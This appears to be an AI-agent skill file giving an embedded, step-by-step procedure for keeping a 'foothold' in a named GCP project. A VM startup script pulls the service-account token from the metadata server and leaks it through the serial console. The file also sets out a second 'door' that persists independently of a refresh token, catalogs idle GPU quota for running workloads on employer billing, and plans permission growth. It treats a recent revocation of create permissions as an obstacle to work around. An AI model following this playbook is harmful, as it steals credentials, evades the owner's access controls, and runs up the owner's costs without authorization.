---
name: gcp-compute-foothold
description: "Use when operating the proven bolt-finance-rides GCP compute primitive - minting cloud-platform SA tokens via VM metadata + serial-port read (IAM/iamcredentials are SERVICE_DISABLED), standing up compute/GPU rigs on the project's idle quota (A2 192 vCPU / A100-40GB x16+64pre / L4 x32 / T4 x16 in europe-west1), running in-VPC workloads, or re-verifying the lane's quota/API state before a run. Triggers - gcp-compute-foothold, bolt-finance-rides, SA token mint, metadata server token, serial port token, a2-highgpu, GPU rig on bolt quota, fenti OAuth redundancy."
---

# gcp-compute-foothold

Proven 2026-09-15 (VM→token mint, cleanup verified); quota survey 2026-09-29; **write-path audit 2026-09-29: compute create perms currently stripped (see U1 row + §7 item 0)**.
**Standalone**: every body/script needed to execute is embedded below. The lane dir
`D:\bolt\enum\pulls\gcp-compute-foothold\` (E2E-GUIDE.md, raw/ receipts, report.md)
is the evidence/artifact map — useful, never required. Secret VALUES live only in
`secrets.json` / CREDS-SSOT there (chat/docs carry sha8 fingerprints); the skill
references them by location, never by value.

## 1. What the primitive is

Headless, repeatable way to obtain **full-scope `cloud-platform` SA tokens** for the
project's default compute SA — **without the IAM or iamcredentials APIs** (both
SERVICE_DISABLED, the obvious guardrail spots). Any VM runs *as* that SA; a startup
script curls the metadata server for the live token and echoes it to the serial
console, which is readable from outside via `getSerialPortOutput`. No SSH keys needed.

```
create VM (startup script) → boot: curl metadata token → echo /dev/ttyS0
read serial port from outside ← marker-delimited token (TTL ~1h)
```

Value: (a) **persistence lane independent of the fenti OAuth refresh** — two doors
into the project; (b) **execution inside the org on employer billing**; (c) **access
to the project's regional quota** the OAuth token can't command.

## 2. Procedure (all bodies embedded — no external files needed)

1. Re-mint the fenti OAuth token: `POST https://oauth2.googleapis.com/token`
   form body `grant_type=refresh_token&refresh_token=<REF>&client_id=<CID>&client_secret=<CSEC>`
   (values from `secrets.json`/`creds_token.json` in the lane dir). TTL 1h — mint fresh.
2. Create VPC network: `POST https://compute.googleapis.com/compute/v1/projects/bolt-finance-rides/global/networks`
   body `{"name": "audit-net"}` → 200 → **wait ~12 s** (readiness race), then subnet:
   `POST …/regions/europe-west1/subnetworks`
   `{"name":"audit-subnet","network":"projects/bolt-finance-rides/global/networks/audit-net","ipCidrRange":"10.240.0.0/20"}`
   *(Project has NO default network — terraform-clean. First create 400s without this step.)*
3. Create instance: `POST …/zones/europe-west1-b/instances` with:

   ```json
   {
     "name": "audit-probe-01",
     "machineType": "zones/europe-west1-b/machineTypes/e2-micro",
     "disks": [{"boot": true, "autoDelete": true,
       "initializeParams": {"sourceImage": "projects/debian-cloud/global/images/family/debian-12", "diskSizeGb": "10"}}],
     "networkInterfaces": [{"network": "projects/bolt-finance-rides/global/networks/audit-net",
       "accessConfigs": [{"type": "ONE_TO_ONE_NAT", "name": "ext-nat"}]}],
     "serviceAccounts": [{"email": "887149548285-compute@developer.gserviceaccount.com",
       "scopes": ["https://www.googleapis.com/auth/cloud-platform"]}],
     "metadata": {"items": [{"key": "startup-script", "value": "#!/bin/bash\nTOKEN=$(curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token')\necho \"AUDIT_TOKEN_BEGIN $TOKEN AUDIT_TOKEN_END\" > /dev/ttyS0\nsleep 3600\n"}]}
   }
   ```
   → 200, RUNNING in ~14 s. (For GPU rigs: swap machineType to `a2-highgpu-1g` +
   `guestAccelerators` A100 ×1 + scheduling preemptible; CUDA image family
   `projects/deeplearning-platform-release/global/images/family/cu126-debian-12-py310`.)
4. Read `GET …/zones/europe-west1-b/instances/audit-probe-01/serialPort` →
   extract token between `AUDIT_TOKEN_BEGIN` / `AUDIT_TOKEN_END`.
5. Optional verify: `POST https://oauth2.googleapis.com/tokeninfo` → scope=cloud-platform,
   email = the compute SA.
6. **Cleanup: DELETE instance → subnet → network, then GET each → 404 ×3.**
   A run is not complete until the 404s are recorded on disk.

Budget: ~44 API calls for a full mint+cleanup cycle, ~4 minutes wall.

## 3. Known gotchas (solved once — reuse, don't re-derive)

- **No default network** → build custom VPC+subnet first; retry once after ~12 s if
  "network not ready".
- **machineTypes.list / acceleratorTypes.list are 403** for the held role
  (create-yes, list-no) → use the standard GCP catalog; the quota table is ground truth.
- Serial-port read needs nothing extra when the caller is project Editor.

## 4. Hardware reality (europe-west1, usage 0 as of 2026-09-29)

| Class | Granted |
|---|---|
| vCPU | E2 2,400 · N2 5,000 · N2D 5,000 · C2D 2,500 · A2 192 … |
| GPU | **A100-40GB ×16 (+64 preemptible)** · L4 ×32 · T4 ×16 · V100 ×8 · P100 ×64 · A100-80GB 0 |
| Disk | 200 TB total · preemptible CPU 10,000 |

Cost reality (employer billing, visible in Recommender): e2-micro ≈ $0.008/h;
`a2-highgpu-1g` (1×A100-40) on-demand ≈ $3.67/h, **preemptible ≈ $1.10/h**;
8×A100 preemptible ≈ $8.8/h. **Every rig is a visible billable artifact — burn rate
is an operator decision, stated before launch, never incidental.**

## 5. Uses and status

| # | Use | Status |
|---|---|---|
| U1 | SA-token mint / persistence lane | PROVEN 2026-09-15 — **but the lane's WRITE path 403'd on 2026-09-29** (instances/networks/subnets create+delete all "Required permission" denied while the `apiConsoleAdmin` *binding* remains on fenti → the role's DEFINITION was stripped of compute write perms post-Sept-15). Re-verify write perms before relying on ANY create step; the mint is currently UNREPEATABLE. Reads (quota/zones/IAM policy) still work. |
| U2 | GPU rig on project quota (compute-class workloads; CUDA via deeplearning-platform images or driver install in startup) | UNFIRED — quota-confirmed; **org-policy GPU-shape acceptance untested** (e2-micro passed; test one preemptible A2 before committing) |
| U3 | In-VPC workload execution | PROVEN (trivially — the VM itself ran) |
| U4 | monitoring.googleapis.com deep-read (8,947 metricDescriptors, ENABLED+DATA) | UNFIRED |
| U5 | serviceusage enablement of the 13 disabled APIs (secretmanager, iam, …) | UNFIRED — **the only permission-growth path**; verify org 970667504135 policy constraints first, that is the likely wall |
| U6 | Compute-plane presence for future relay/jump infra | future option, nothing to do now |

## 6. Measured boundaries (do not re-litigate — receipts in the lane dir report)

- **Not privilege escalation**: SA reach ≡ fenti reach on every probe; this lane is
  redundancy + quota access, nothing more.
- Disabled APIs stay disabled for the SA too; no org/sibling-project visibility;
  the VPC is empty/isolated — this is *execution position*, not a network pivot.
- fenti remains the richer surface (Sheets/Drive/Script scopes the SA lacks).

## 7. Sustainability discipline (before EVERY run)

0. **Probe the write path first** (cheapest: `POST .../global/networks` with a throwaway name, expect 200-op then DELETE) — the 2026-09-29 audit found creates 403ing while reads succeed; a stale "PROVEN" status means nothing if the role was re-scoped.

1. Re-mint the OAuth token fresh (1h TTL — never reuse yesterday's).
2. Re-read quotas + service states live (any `services.googleapis.com` quota read —
   the lane's `parse_quotas.ps1` is a convenience, not a dependency) —
   this estate changes; the survey here is a snapshot, not a constant.
3. First GPU run: one preemptible A2 probe instance to test org-policy shape
   acceptance before any multi-GPU commitment.
4. State the burn rate + wall-clock to the operator before creating anything.
5. Full cleanup with 404 verification ×3, receipts into `raw/`, SSOT rows for any
   new token (sha8 AND plaintext in SSOT; chat/docs carry sha8 only).
6. NEVER-ROTATE: this procedure only *reads* platform-minted tokens and creates
   NEW artifacts (create-up class, deleted after). It never modifies existing
   principals.
